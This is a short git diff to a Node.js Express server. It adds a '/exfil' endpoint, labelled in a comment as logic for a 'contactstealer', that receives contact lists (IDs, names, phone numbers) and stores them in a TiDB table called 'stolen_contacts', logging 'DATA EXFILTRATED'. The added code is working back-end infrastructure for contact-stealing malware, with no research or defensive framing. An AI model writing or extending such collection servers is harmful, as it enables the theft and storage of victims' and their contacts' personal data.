@@ -49,6 +49,30 @@ app.post('/data', (req, res) => {
     }
 });
 
+// Logic for the contactstealer
+app.post('/exfil', (req, res) => {
+    const contacts = req.body.contacts;
+    
+    if (!contacts || !Array.isArray(contacts)) {
+        return res.status(400).send({status: 'Error', message: 'No contacts received'});
+    }
+
+    // Mapping fields
+    const sql = "INSERT INTO stolen_contacts (contact_id, first_name, last_name, phone_number) VALUES ?";
+    const values = contacts.map(c => [c.id, c.firstName, c.lastName, c.phone]);
+
+    connection.query(sql, [values], (err, results) => {
+        if (err) {
+            console.error('TiDB Insert Error:', err);
+            return res.status(500).send({status: 'Error', message: err.message});
+        }
+        console.log(`DATA EXFILTRATED: ${results.affectedRows} records added to TiDB.`);
+        res.send({status: 'Success', message: 'Data successfully saved to TiDB'});
+    });
+});
+
+
+
 //  Database connection setup
 
 const dbConfig = {
@@ -109,3 +133,4 @@ process.on('SIGINT', () => {
   process.exit();
 
 });
+
